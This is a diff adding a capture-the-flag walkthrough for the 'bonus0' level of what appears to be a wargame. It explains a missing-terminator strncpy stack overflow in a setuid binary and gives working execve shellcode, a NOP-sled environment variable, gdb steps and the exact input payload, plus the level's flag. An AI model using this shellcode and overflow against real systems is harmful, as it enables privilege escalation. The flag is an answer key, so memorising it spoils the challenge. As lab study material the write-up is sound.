@@ -1,0 +1,73 @@
+# Bonus0 Walkthrough
+
+Binary is setuid `bonus1`. It reads two inputs and prints them joined by a separator.
+
+```c
+void p(char *dest, char *sep) {
+  char buf[4104];
+  puts(sep);
+  read(0, buf, 4096);
+  *strchr(buf, '\n') = 0;
+  strncpy(dest, buf, 20);        // copies 20 bytes, no null terminator
+}
+
+void pp(char *dest) {
+  char a[20];
+  char b[20];
+  p(a, " - ");
+  p(b, " - ");
+  strcpy(dest, a);
+  strcat(dest, " ");
+  strcat(dest, b);
+}
+
+int main(void) {
+  char dest[54];
+  pp(dest);
+  puts(dest);
+  return 0;
+}
+```
+
+## Vulnerability
+
+`strncpy(dest, buf, 20)` copies exactly 20 bytes and does not NUL-terminate when the
+input is 20 chars or longer. `a` and `b` are adjacent on the stack, so `a` without a
+terminator makes `strcpy(dest, a)` read past `a` into `b`: the two inputs get glued
+together into one long string and copied into `dest[54]`. That overflows `dest` and
+overwrites the saved return address of `main`.
+
+NX is disabled and ASLR is off, so we can return to shellcode at a fixed address.
+
+## Exploitation
+
+Shellcode is placed in an environment variable preceded by a large NOP sled (reliable:
+no need for a byte-exact address). The overflow only has to overwrite the return
+address with an address inside that sled.
+
+- Offset from `dest` to the saved return address: 54 bytes (measured in gdb:
+  `($ebp+4) - ($esp+0x16) = 0xbffff71c - 0xbffff6e6 = 0x36`).
+- The return address lands inside `input2` because `dest = input1 + input2 + " " + input2`.
+
+```sh
+export SC=$(python -c 'print "\x90"*20000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+# find the sled address, then aim for its middle (+0x2710)
+gdb -q ./bonus0
+break main
+run
+p (char *)getenv("SC")        # e.g. 0xbfffb0f4  ->  target 0xbfffd804
+
+(python -c 'print "A"*20'; sleep 1; python -c 'print "A"*14 + "\x04\xd8\xff\xbf" + "A"'; cat) | ./bonus0
+```
+
+- saise 1 = `"A"*20`: fills the first 20 bytes (no terminator -> triggers the glue).
+- saise 2 = `"A"*14 + address + "A"`: the 4-byte return address falls at offset 54.
+- `sleep 1`: separates the two `read` calls so each gets its own line.
+- `cat`: keeps stdin open so the spawned shell stays usable.
+
+Flag:
+
+```txt
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
